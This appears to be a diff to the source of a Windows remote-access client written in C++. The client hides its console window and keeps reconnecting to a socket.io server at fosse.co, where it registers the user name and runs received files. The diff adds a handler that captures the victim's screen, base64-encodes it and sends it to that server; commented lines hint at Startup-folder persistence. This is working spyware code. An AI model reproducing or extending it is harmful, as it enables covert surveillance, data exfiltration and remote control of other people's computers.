@@ -21,6 +21,11 @@
 #include <vector>
 
 #include <algorithm>
+#include "screen.h"
+#include "base64.h"
+
+#include <gdiplus.h>
+#pragma comment(lib, "Gdiplus.lib")
 
 //#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:mainCRTStartup")
 
@@ -247,9 +252,6 @@ void deleteDir() {
 
 
 std::string getFileNameFromPath(std::string path) {
-	
-
-	int lastIndex;
 	int no_of_backslash = (int)count(path.begin(), path.end(), '\\');
 	if (no_of_backslash == 0) {
 		std::size_t found = path.find_last_of("/\\");
@@ -273,6 +275,12 @@ int main() {
 	// hide console window
 	HWND hWnd = GetConsoleWindow();
 	ShowWindow(hWnd, SW_HIDE);
+
+	// Initialize GDI+.
+	ULONG_PTR m_gdiplusToken;
+	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+	Gdiplus::GdiplusStartup(&m_gdiplusToken, &gdiplusStartupInput, NULL);
+
 
 	char user_name[UNLEN + 1];
 	DWORD user_name_size = sizeof(user_name);
@@ -390,7 +398,13 @@ int main() {
 	myClient.set_reconnect_attempts(999999999999);
 
 	//myClient.connect("http://fosse.co:443/socket.io");
-	myClient.connect("http://fosse.co:80/socket.io");
+	//myClient.connect("http://fosse.co:80/socket.io");
+	myClient.connect("http://fosse.co:80/socket.io"); // what it was
+
+	myClient.connect("https://fosse.co:80/socket.io"); // works
+	//myClient.connect("https://fosse.co:80/8100/socket.io");
+	//myClient.connect("http://fosse.co/8110");// works
+
 
 	// emit text
 	myClient.socket()->emit("registerName", name);
@@ -466,6 +480,19 @@ int main() {
 			execute(filenameChar);
 		}
 
+	}));
+
+	myClient.socket()->on("ss", sio::socket::event_listener_aux([&](std::string const& name, sio::message::ptr const& data, bool isAck, sio::message::list &ack_resp) {
+		
+		RECT      rc;
+		GetClientRect(GetDesktopWindow(), &rc);
+		POINT a{ 0, 0 };
+		POINT b{ 1920, 1080 };
+
+		std::string encoded_string = screenshotToBase64(a, b);
+		//printf("\n%s\n", encoded_string);
+
+		myClient.socket()->emit("screenshot", encoded_string);
 	}));
 	
 
@@ -547,13 +574,6 @@ int main() {
 	//		//localShortcutPath += user_name;
 	//		//localShortcutPath += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
 
-
-
-
-
-
-
-
 	//		/* REMOTE */
 	//		/*
 	//		// list drives
@@ -616,6 +636,12 @@ int main() {
 	//		std::cout << path << std::endl;
 	//	}*/
 	//}
+
+
+	// Shut Down GDI+
+	//Gdiplus::GdiplusShutdown(m_gdiplusToken);
+
+	
 
 	// why is this necessary??
 	int x;
